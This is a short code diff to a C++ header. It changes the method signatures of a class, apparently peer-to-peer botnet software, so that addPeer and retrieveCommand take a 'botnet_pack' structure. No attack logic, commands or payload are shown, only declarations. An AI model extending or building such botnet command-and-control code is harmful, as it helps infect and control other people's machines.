@@ -51,8 +51,9 @@ public:
 	);
 
 	struct sockaddr_in addPeer(
-		const u_char* data,
-		BOOL* status
+		struct botnet_pack* const pack,
+		struct sockaddr_in private_addr,
+		BOOL* const status
 	);
 
 	void handleSync(
@@ -83,6 +84,6 @@ public:
 	);
 
 	adr retrieveCommand(
-		u_char* const data
+		struct botnet_pack* const command_res
 	);
 };
